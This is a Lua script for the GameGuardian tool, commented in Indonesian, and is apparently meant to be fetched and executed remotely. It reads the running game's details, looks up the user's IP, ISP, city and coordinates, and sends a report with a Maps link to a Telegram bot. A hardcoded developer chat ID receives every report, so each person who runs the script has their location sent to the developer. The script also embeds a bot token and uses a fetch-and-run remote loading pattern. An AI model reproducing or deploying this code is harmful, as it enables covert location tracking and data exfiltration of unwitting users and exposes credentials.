-- [[ JULES-CORE REMOTE LOGIC SCRIPT ]]
-- Script ini didesain untuk di-load secara remote:
-- assert(load(gg.makeRequest('URL_SCRIPT').content))()

-- 1. IDENTITAS DEVELOPER (ADMIN)
local ADMIN_ID = "6149504951" -- ID Tetap Anda

-- 2. KONFIGURASI PENGGUNA (PUBLIC)
-- Diambil dari variabel global yang diisi user di script loader mereka
local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
local USER_ID = _G.USER_CHAT_ID or "6149504951"

-- [[ SYSTEM FUNCTIONS ]]
local function get_session_info()
    local gameName = "Unknown Game"
    local package = "Unknown Package"
    local status, info = pcall(gg.getTargetInfo)
    if status and info then
        gameName = info.label or gameName
        package = info.packageName or package
    end
    return { game = gameName, package = package }
end

local function get_location()
    gg.toast("🛰️ Memperoleh koordinat lokasi...")
    local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
    local response = gg.makeRequest(url)
    if not response or response.code ~= 200 then return nil end
    local lines = {}
    for line in response.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
    if lines[1] ~= "success" then return nil end
    return {
        country = lines[2], region = lines[3], city = lines[4],
        lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8]
    }
end

local function send_report()
    local date = os.date("%Y-%m-%d")
    local time = os.date("%H:%M:%S")
    local session = get_session_info()
    local loc = get_location()
    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")

    local line = "━━━━━━━━━━━━━━━━━━━━"
    local message = "🚀 <b>[ VELLSC SYSTEM REPORT ]</b>\n" ..
                    line .. "\n" ..
                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
                    line .. "\n" ..
                    "<b>🎮 GAME    :</b> <code>" .. session.game .. "</code>\n" ..
                    "<b>📦 PACKAGE :</b> <code>" .. session.package .. "</code>\n" ..
                    line .. "\n" ..
                    "<b>🌐 IP ADDR :</b> <code>" .. (loc and loc.ip or "Unknown") .. "</code>\n" ..
                    "<b>🏢 ISP     :</b> <code>" .. (loc and loc.isp or "Unknown") .. "</code>\n" ..
                    "<b>🏙️ KOTA    :</b> <code>" .. (loc and loc.city or "Unknown") .. "</code>\n" ..
                    "<b>🇮🇩 NEGARA  :</b> <code>" .. (loc and loc.country or "Unknown") .. "</code>\n" ..
                    line .. "\n" ..
                    "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }
    local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')

    -- Daftar target: Admin (Developer) dan User (Public)
    local targets = {ADMIN_ID, USER_ID}

    gg.toast("📡 Mengirim data ke Admin & Public...")

    for i, id in ipairs(targets) do
        -- Mencegah duplikasi jika Admin ID sama dengan User ID
        if i == 2 and id == targets[1] then break end

        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
        gg.makeRequest(tgUrl, headers, body)
    end
end

send_report()
